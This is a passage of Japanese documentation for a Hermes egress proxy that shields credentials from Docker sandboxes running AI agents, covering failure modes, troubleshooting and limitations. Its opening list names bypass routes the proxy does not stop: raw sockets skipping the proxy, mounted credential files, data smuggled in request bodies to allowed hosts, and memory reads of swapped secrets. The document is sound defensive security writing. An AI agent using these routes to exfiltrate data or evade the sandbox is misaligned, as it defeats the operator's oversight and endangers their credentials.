- 生のソケットを使って `HTTPS_PROXY` を迂回するサンドボックスのプロセス。自分のところに来ない通信は、プロキシには捕まえられません。Node.js については `NODE_OPTIONS=--use-openssl-ca` で部分的に緩和しています（前述の注意点を参照）。
- Docker へ明示的にマウントされた資格情報のファイル（`terminal.credential_files` やスキルが登録したマウント）。外向き通信のプロキシが守るのはプロバイダーの環境変数で、マウントされた任意のファイルの中身までは見ません。egress を強制しているサンドボックスに、本物のプロバイダーの資格情報をマウントしないでください。
- 許可済みのホストを経由したデータの持ち出し。`api.openai.com` を許可していれば、エージェントはそのホストへのリクエストの本文に持ち出したいデータを紛れ込ませられます。デーモンのログには、そのリクエストがあったことは残りますが、止めることはできません。
- 対応していないプロバイダー（AWS Bedrock の SigV4、GCP Vertex のサービスアカウントによる OAuth）。これらの環境変数はサンドボックスに残るので、使うようにするとその資格情報はプロキシをまるごと迂回します。[対応していないプロバイダー](#uncovered-providers) を参照してください。
- iron-proxy がメモリ上の秘密情報を消すこと。Go のバイナリは、差し替えた本物の資格情報をプロセスのメモリに保持します。同じ uid の攻撃者がコアダンプや `/proc/<pid>/mem` を読めば、それが露出します。この層の守備範囲の外です。

## うまくいかないときの動き {#failure-modes}

- **バイナリが入っておらず、`auto_install: true` のとき** — 最初の `hermes egress setup` か `hermes egress start` で取得します。上流の `checksums.txt` に照らして SHA-256 を確かめます。
- **バイナリが入っておらず、`auto_install: false` のとき** — `start` が失敗し、手作業での導入方法を示すはっきりしたメッセージを出します。
- **`enabled: true` なのにプロキシが動いていないとき** — 既定の `enforce_on_docker: true` では、Docker サンドボックスの作成が理由付きのエラーで断られます。`enforce_on_docker: false` では、本物の資格情報のまま直接外へ出る動きに退避し、警告を残します。
- **ポートのぶつかり** — iron-proxy はすぐ終了します。`hermes egress start` はログの末尾 20 行を示し、0 以外の終了コードで失敗します。
- **上流のホストが拒否されたとき** — サンドボックスはプロキシから HTTP 403 を受け取り、本文にどのホストが許可されていなかったかが書かれています。エージェントはそのエラーを見て報告します。
- **クラウドのメタデータの IP（169.254.169.254）へのリクエスト** — 許可の並びと関係なく `upstream_deny_cidrs` が断ります。
- **`docker_env` がプロキシの動きを左右する変数とぶつかったとき（強制が有効）** — サンドボックスの作成が、ぶつかっているキーの名前を示して断られます。
- **`docker_forward_env` が守られているプロバイダーのキーを渡そうとしたとき（強制が有効）** — サンドボックスの作成が断られます。`docker_forward_env` からそのキーを外すか、`proxy.enforce_on_docker: false` で外れてください。
- **`docker_extra_args` がプロキシの環境変数やネットワークの指定を上書きしたとき（強制が有効）** — サンドボックスの作成が断られます。利用者が渡した `-e HTTPS_PROXY=...`、`--env-file`、`--network` は、Hermes が組み立てた引数のあとに効くので、外向き通信の制御を迂回できてしまうからです。
- **`credential_source: bitwarden` で BWS のアクセストークンが無いとき** — `hermes egress start` が断り、立て直しの手立てとして `--no-bitwarden` を示します。
- **iron-proxy が 5 秒以内にバインドしないとき** — プロセスを終了させ、pid のファイルを消し、ポート名と `iron-proxy.log` の末尾を添えたエラーを出します。
- **`hermes egress start` の同時呼び出し** — 先に来たほうのデーモンが立ち上がっていれば、後から来たほうは「another start in progress」と断ります。そうでなければ、後から来たほうが古い pid のファイルを消して先へ進みます。

## 困ったときは {#troubleshooting}

### 「Refusing to start: BWS_ACCESS_TOKEN is not set」 {#refusing-to-start-bwsaccesstoken-is-not-set}

`credential_source: bitwarden` を有効にしたのに、アクセストークンの環境変数がシェルにありません。次のどちらかを行ってください。

```bash
export BWS_ACCESS_TOKEN=…   # one-shot
hermes egress start
```

あるいは `~/.hermes/.env` へ移します。または env モードに戻します。

```bash
hermes egress setup --no-bitwarden
```

### 「iron-proxy exited immediately」 {#iron-proxy-exited-immediately}

`~/.hermes/proxy/iron-proxy.log` の末尾 20 行を見てください。よくある原因はこちらです。

- ポートが既に使われている → `proxy.tunnel_port` を変えるか、9090 を掴んでいる相手を終了させます
- `proxy.yaml` が壊れている → `hermes egress setup` を実行して作り直します
- CA の証明書や鍵の権限が違う → `chmod 0o600 ~/.hermes/proxy/ca.key`

### 「iron-proxy did not bind \<bind-host\>:9090 within 5s」 {#iron-proxy-did-not-bind-bind-host9090-within-5s}

デーモンは起動したものの、待ち受けを始めませんでした。たいていは、バイナリが引っかかっているか、起動時に重い処理をしています。`~/.hermes/proxy/iron-proxy.log` を確認してください。取り残されたプロセスは自動で終了させ、pid のファイルも片付けるので、`hermes egress start` をそのままやり直せます。

### サンドボックスからプロキシへの接続がタイムアウトする（Linux） {#sandbox-times-out-connecting-to-the-proxy-linux}

コンテナは `host.docker.internal` を docker のブリッジゲートウェイに解決し、プロキシもそこを掴んでいるのに、ホスト側のファイアウォール（よくあるのは INPUT を既定で拒否している `ufw`）が、`docker0` 上のコンテナからホストへの通信を落としています。コンテナから確かめてみてください。

```bash
docker run --rm --add-host host.docker.internal:host-gateway busybox \
  nc -zv -w 3 host.docker.internal 9090
```

`hermes egress status` が `listening` と表示しているのにこれがタイムアウトするなら、ファイアウォールでブリッジのサブネットを許可します。ufw ならこうです。

```bash
sudo ufw allow in on docker0 to any port 9090 proto tcp
sudo ufw allow in on docker0 to any port 9091 proto tcp
```

（9091 は `tunnel_port + 1` にある、平文 HTTP を転送する待ち受けです。）

### サンドボックスがプロキシから `HTTP 403` を受け取る {#sandbox-sees-http-403-from-the-proxy}

サンドボックス内のエージェントが、`proxy.extra_allowed_hosts` にないホストへ接続しようとしました。403 の本文にどのホストかが書かれています。許可したいなら、設定に足してください。

```yaml
proxy:
  extra_allowed_hosts:
    - api.example.com
    - "*.staging.example.com"
```

そのうえで `hermes egress setup`（`proxy.yaml` を作り直すため）と `hermes egress stop && hermes egress start` を実行します。

### サンドボックスで SSL の検証エラーが出る {#sandbox-sees-ssl-verification-errors}

CA がサンドボックスにマウントされていないか（`proxy.enabled: true` なら docker バックエンドが自動で行うので、まれです）、イメージ内の HTTP クライアントが、標準的でない環境変数を読んでいます。

```bash
# Inside the sandbox:
cat /etc/ssl/certs/hermes-egress-ca.crt | head -1
# Should print: -----BEGIN CERTIFICATE-----
env | grep -E "^(REQUESTS|CURL|SSL|NODE).*CA"
# Should list all four CA-bundle env vars pointing at /etc/ssl/certs/hermes-egress-ca.crt
```

証明書がそこに無ければ、`proxy.enabled: true` になっていること、そして `hermes egress status` が `Listening yes` を示していることを確かめてください。環境変数が無ければ、サンドボックスのイメージが、それらを取り除く entrypoint を動かしているのかもしれません。`docker_env` の設定を確認してください。

### サンドボックスが上流から `HTTP 401` を受け取る {#sandbox-sees-http-401-from-upstreams}

よくある原因は 2 つです。

1. **setup をやり直したときにトークンが変わった。** `hermes egress setup --rotate-tokens`（や別の方法でのトークンの入れ替え）を実行し、動いているサンドボックスが古いトークンを抱えたままです。サンドボックスを起動し直してください。
2. **Bitwarden からの取り直しが黙って失敗した。** 起動時にはっきり止まるようになった今は起こらないはずですが、`proxy.allow_env_fallback: true` を設定していると、デーモンが古い環境変数の値で起動していることがあります。デーモンの環境（`/proc/<iron-proxy-pid>/environ`）に、期待する `OPENROUTER_API_KEY` などが入っているか確かめてください。

### 親プロセスが落ちたあとの「Address in use」 {#address-in-use-after-the-parent-process-died}

`hermes egress start` の途中で親の Hermes プロセスが落ちました（待ち受けの確認中の Ctrl-C、OOM、panic など）。新しい後始末の処理は `Popen` の直後に pid のファイルを書くので、取り残されたプロセスも回収できます。

```bash
hermes egress stop   # finds the orphan via the pidfile, kills it
hermes egress start
```

`hermes egress stop` が「iron-proxy was not running」と言うのに、`ps` ではまだデーモンが見えるなら、pid のファイルがずれています。手作業での立て直しはこうです。

```bash
pkill -TERM iron-proxy
rm -f ~/.hermes/proxy/iron-proxy.pid ~/.hermes/proxy/iron-proxy.nonce
hermes egress start
```

### リクエストごとの動きを調べる {#inspecting-per-request-behavior}

固定しているバイナリ版（**v0.39**）では、デーモン側の出来事も、リクエストごとの記録も、どちらも `~/.hermes/proxy/iron-proxy.log` に集まります。形式は 1 行 1 件の JSON です。特定の上流を絞り込むにはこうします。

```bash
grep '"upstream":"openrouter.ai"' ~/.hermes/proxy/iron-proxy.log | tail -20
```

流れているものをそのまま見るにはこちらです。

```bash
tail -f ~/.hermes/proxy/iron-proxy.log | jq
```

固定する版が v0.40 以降（`log.audit_path` が加わった版）へ移れば、リクエストごとの記録は `~/.hermes/proxy/audit.log` へ移り、`iron-proxy.log` にはデーモン側の出来事だけが残ります。その版上げまで、`audit.log` は空の置き場です（将来のデーモンが厳しい権限を引き継げるよう、`0o600` で先に作ってあります）。今は logrotate や監視の道具を `iron-proxy.log` に向けておき、版上げのあとで `audit.log` を足す計画にしてください。

## 制限（v1） {#limitations-v1}

- Docker バックエンドのみです。Modal、Daytona、SSH への組み込みは別の PR で続きます。
- 署名にもとづく認証を使うプロバイダー（AWS の SigV4、GCP のサービスアカウントによる OAuth）は、プロキシをまるごと迂回します。[対応していないプロバイダー](#uncovered-providers) を参照してください。ヘッダーにトークンを載せるプロバイダー（bearer、`x-api-key`、`api-key`、`x-goog-api-key`）はすべて対応しています。
- 上流に Windows 向けのバイナリがありません。Linux / macOS / WSL で動かしてください。
- CA は最初に作られるとき、10 年間有効の自己署名の証明書になります。入れ替えるには `openssl genrsa ...` を手作業で行う必要があります（`hermes egress rotate-ca` を足す後続の対応を待つのでもかまいません）。
- setup をやり直すと、設定や対応付けを書き換えたあとで動いているデーモンを止めます。起動し直し（許可の並びだけの変更なら `hermes egress reload`）、トークンを入れ替えたあとは、すでに動いているサンドボックスも起動し直してください。
- iron-proxy がメモリ上の秘密情報を消すかどうかは上流次第です。`/proc/<pid>/mem` を読める同じ uid の攻撃者は、差し替えられた秘密情報をデーモンのメモリから読み取れます。
- iron-proxy v0.39 は**デーモン 1 つにつきバインド 1 つ**しか扱えず（こちらは Linux で docker のブリッジゲートウェイ、Docker Desktop でループバックを掴みます）、デーモンの記録とリクエストごとの記録を 1 つのログにまとめます。上流が `proxy.http_listens`（複数形）と `log.audit_path` に対応すれば、版上げで複数のバインドと専用の監査の流れを組み込めます。

## あわせて読む {#see-also}

- 上流のプロジェクト: [github.com/ironsh/iron-proxy](https://github.com/ironsh/iron-proxy)
- 上流のドキュメント: [docs.iron.sh](https://docs.iron.sh/)
- Bitwarden との連携: [`hermes secrets bitwarden`](/hermes/docs/user-guide/secrets/bitwarden/)
- Hermes の Docker ターミナルバックエンド: [Docker](/hermes/docs/user-guide/docker/)
- 開発者・貢献者向けの詳しい情報: [Egress プロキシの内部](/hermes/docs/developer-guide/egress-internals/)
